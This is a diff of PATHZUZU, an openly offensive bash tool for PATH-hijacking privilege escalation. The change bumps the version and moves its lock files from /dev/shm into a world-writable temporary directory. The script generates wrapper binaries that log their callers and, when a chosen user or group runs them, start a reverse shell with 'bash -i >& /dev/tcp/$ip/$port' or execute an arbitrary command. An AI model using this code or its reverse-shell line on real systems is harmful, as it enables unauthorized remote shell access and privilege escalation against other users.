@@ -1,14 +1,14 @@
 #!/usr/bin/env bash
 #+-----------+
 #|PA(TH)ZUZU!|
-#+-v1.6.7----+------+
+#+-v1.6.8----+------+
 #|Brought to you by:|
 #| Shotokan@aitch.me|
 #+-PGP-AHEAD--------+----------+
 #|https://keybase.io/ShotokanZH|
 #+-$BEGIN----------------------+
 
-export l_version="1.6.7";
+export l_version="1.6.8";
 
 #color definition
 export def=$(echo -en "\e[1;32m");	#used for definitions, bold green
@@ -190,8 +190,10 @@ then
 	ex_ugid="${ex_ugid}[ \"\$(id -g)\" == \"$t_uid\" ] && ";
 fi;
 
-tmpd=$(mktemp -d);
+tmpd=$(mktemp -d);	#link directory
 chmod 755 "$tmpd";
+tmpl=$(mktemp -d);	#lock directory
+chmod 777 "$tmpl";
 tmpf=$(mktemp);
 
 echo "#!$(which bash)" > $tmpf;
@@ -200,17 +202,17 @@ echo "echo \"\$(whoami)#\$(id -u):$(id -g) RUN: \$(basename \"\$0\") \$@\" >> $s
 
 if [ "$ip" != "" ] && [ "$port" != "" ];
 then
-	echo "if ${ex_ugid} mkdir /dev/shm/pathzuzu_rev_lock 2>/dev/null;" >> $tmpf;
+	echo "if ${ex_ugid} mkdir ${tmpl}/pathzuzu_rev_lock 2>/dev/null;" >> $tmpf;
 	echo "then" >> $tmpf;
-	echo -e "\tchown $(whoami):$(whoami) /dev/shm/pathzuzu_rev_lock;" >> $tmpf;
+	echo -e "\tchmod 777 ${tmpl}/pathzuzu_rev_lock;" >> $tmpf;
 	echo -e "\tbash -i >& /dev/tcp/$ip/$port 0>&1 &" >> $tmpf;
 	echo "fi;" >> $tmpf;
 fi;
 if [ "$exe" != "" ];
 then
-	echo "if ${ex_ugid} mkdir /dev/shm/pathzuzu_exe_lock 2>/dev/null;" >> $tmpf;
+	echo "if ${ex_ugid} mkdir ${tmpl}/pathzuzu_exe_lock 2>/dev/null;" >> $tmpf;
 	echo "then" >> $tmpf;
-	echo -e "\tchown $(whoami):$(whoami) /dev/shm/pathzuzu_exe_lock;" >> $tmpf;
+	echo -e "\tchmod 777 ${tmpl}/pathzuzu_exe_lock;" >> $tmpf;
 	echo -e "\t( $exe ) &" >> $tmpf;
 	echo "fi;" >> $tmpf;
 fi;
@@ -242,9 +244,6 @@ IFS=$OIFS;
 echo "";
 
 shift;
-
-rm -rf "/dev/shm/pathzuzu_rev_lock" 2>/dev/null;
-rm -rf "/dev/shm/pathzuzu_exe_lock" 2>/dev/null;
 
 echo "Running: ${def}$tor $@${res}";
 echo "";
@@ -285,8 +284,7 @@ fi;
 
 rm -rf "$tmpd";
 rm -rf "$tmpf";
-rm -rf "/dev/shm/pathzuzu_rev_lock" 2>/dev/null;
-rm -rf "/dev/shm/pathzuzu_exe_lock" 2>/dev/null;
+rm -rf "$tmpl";
 
 echo "";
 printline;
